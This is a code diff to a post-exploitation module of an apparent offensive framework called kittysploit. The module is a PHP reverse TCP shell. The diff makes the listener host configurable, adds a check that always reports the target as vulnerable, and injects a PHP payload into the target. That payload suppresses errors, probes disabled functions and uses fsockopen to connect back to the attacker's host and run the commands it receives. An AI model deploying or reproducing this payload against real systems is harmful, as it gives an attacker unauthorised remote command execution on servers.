@@ -1,4 +1,5 @@
 from kittysploit import *
+from lib.exploit.handler import Reverse
 
 class Module(Post, Reverse):
 
@@ -6,11 +7,29 @@ class Module(Post, Reverse):
 		"name": "Reverse TCP shell",
 		"description": "Reverse TCP shell in PHP using a reverse handler",
 		"arch": Arch.PHP,
-	}	
+	}
+	
+	lhost = OptString("127.0.0.1", "Local host to listen on", required=True)
+	lport = OptPort(4444, "Local port to listen on", required=True)
+	
+	def check(self):
+		"""Check if target is vulnerable"""
+		return True
 		
 	def run(self):
-		self.start_handler()
-		self.php_eval(f"""
+		# Start reverse handler
+		if not self.start_handler():
+			return False
+		
+		# Wait a moment for listener to start
+		import time
+		time.sleep(1)
+		
+		# Use raw f-string to preserve PHP braces while allowing variable substitution
+		lhost_val = str(self.lhost.value) if hasattr(self.lhost, 'value') else str(self.lhost)
+		lport_val = int(self.lport.value) if hasattr(self.lport, 'value') else int(self.lport)
+		
+		data = rf"""
       @error_reporting(0);
       @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);
       $dis=@ini_get('disable_functions');
@@ -23,8 +42,8 @@ class Module(Post, Reverse):
       }}
       var_dump($dis);
       
-    $ipaddr='{self.lhost}';
-    $port={self.lport};
+    $ipaddr='LHOST_PLACEHOLDER';
+    $port=LPORT_PLACEHOLDER;
 
     if(!function_exists('KtKEFza')){{
       function KtKEFza($c){{
@@ -83,7 +102,7 @@ class Module(Post, Reverse):
     }}
     $nofuncs='no exec functions';
     if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
-      $s=@fsockopen("tcp://127.0.0.1",$port);
+      $s=@fsockopen("tcp://".$ipaddr,$port);
       while($c=fread($s,2048)){{
         $out = '';
         if(substr($c,0,3) == 'cd '){{
@@ -122,4 +141,16 @@ class Module(Post, Reverse):
       @socket_close($s);
     }}
 
-""")
+"""
+		# Replace placeholders with actual values
+		data = data.replace("LHOST_PLACEHOLDER", lhost_val)
+		data = data.replace("LPORT_PLACEHOLDER", str(lport_val))
+		
+		# Execute PHP code
+		print_info("Executing reverse shell payload...")
+		self.cmd_execute(data)
+		
+		# Wait a bit for connection
+		time.sleep(2)
+		
+		return True
